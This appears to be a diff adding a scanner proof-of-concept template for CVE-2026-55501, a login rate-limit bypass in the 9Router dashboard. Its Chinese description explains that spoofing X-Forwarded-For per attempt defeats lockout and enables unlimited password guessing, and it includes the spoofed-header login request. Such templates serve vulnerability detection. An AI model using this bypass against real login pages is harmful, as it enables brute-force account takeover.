@@ -1,0 +1,42 @@
+[info]
+author = "AVE"
+description = "检测 9Router 仪表盘登录速率限制绕过漏洞。通过伪造 X-Forwarded-For 请求头，每次登录尝试使用不同 IP 值，可绕过 5 次尝试阈值和渐进式锁定机制，实现无限制暴力破解。"
+id = "POC-AVE-2026-0618"
+name = "9router Login Brute-Force Protection Bypass PoC"
+severity = "high"
+tags = [
+    "cve-2026-55501",
+    "ghsa-7cfm-pqrj-xgq7",
+    "brute-force",
+    "rate-limit-bypass",
+]
+vuln_id = [
+    "CVE-2026-55501",
+    "GHSA-7cfm-pqrj-xgq7",
+    "AVE-2026-0618",
+]
+
+[poc]
+logic = "any"
+
+[[poc.requests]]
+method = "POST"
+path = "/{{BaseURL}}/api/auth/login"
+protocol = "http"
+
+[poc.requests.body]
+content = '{"password":"wrong-password"}'
+type = "json"
+
+[poc.requests.headers]
+Content-Type = "application/json"
+X-Forwarded-For = "10.0.0.1"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = [
+    "remainingBeforeLock",
+    "4 attempt(s) left",
+]
